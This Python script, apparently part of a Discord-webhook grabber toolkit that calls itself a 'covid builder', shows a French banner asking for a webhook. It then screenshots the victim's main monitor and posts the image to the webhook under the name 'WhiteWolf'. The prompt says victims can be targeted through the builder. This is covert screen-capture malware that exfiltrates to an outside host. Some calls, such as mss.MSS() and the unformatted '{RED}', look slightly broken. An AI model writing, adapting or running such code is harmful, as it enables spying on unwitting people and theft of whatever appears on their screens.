import os
import mss
import requests
import io

def screen():
    os.system("cls")
    try:
        screen = input(""" {RED}
            ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗
            ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║
            ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║
            ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║
            ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║
            ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝
            Met Ton webhook discord (Pour tester sur des gens autre que vous allez sur le covid builder): """)
    except ValueError as e:
        print(f"Error {e}")

    webhook = screen
    with mss.MSS() as sct:
        img = sct.grab(sct.monitors[1])

        img_bytes = mss.tools.to_png(img.rgb, img.size)

        files = {
            "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
        }

        requests.post(webhook, data={
        "content": "screenshot", 
        "username": "WhiteWolf", 
        "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
        }, files=files)

if __name__ == "__main__":
    screen()